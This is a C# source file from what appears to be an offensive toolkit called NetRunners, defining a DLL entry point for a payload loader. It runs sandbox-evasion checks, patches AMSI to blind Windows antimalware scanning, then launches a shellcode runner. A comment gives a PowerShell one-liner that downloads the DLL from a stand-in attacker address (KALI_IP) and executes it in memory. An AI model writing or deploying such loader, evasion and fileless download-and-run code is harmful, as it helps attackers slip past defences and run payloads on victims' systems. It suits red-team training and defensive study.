using System;
using static NetRunners.Heuristics;
using static NetRunners.Patchers;
using static NetRunners.Runners;

namespace NetRunnersDll
{
    class Class1
    {
        /// <summary>
        /// Main function for this DLL. 
        /// Calls Heuristics and Amsi patch, then calls a runner (uncomment one and keep others commented.)
        /// </summary>
        /// <example>
        /// You can run this compiled managed DLL using this powershell one-liner:
        /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://KALI_IP/NetRunnersDll.dll')).GetType('NetRunnersDll.Class1').GetMethod('Run').Invoke(0, $null)
        /// </example>

        public static void Run()
        {
            // call heuristic functions
            if (Sleep()) { return; }    // if sleep was skipped halt execution
            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution
            // patch amsi
            AmsiOs();

            // Uncomment your choice
            // Runner();
            // PiRunner();
            EpsRunner();
        }
    }
}
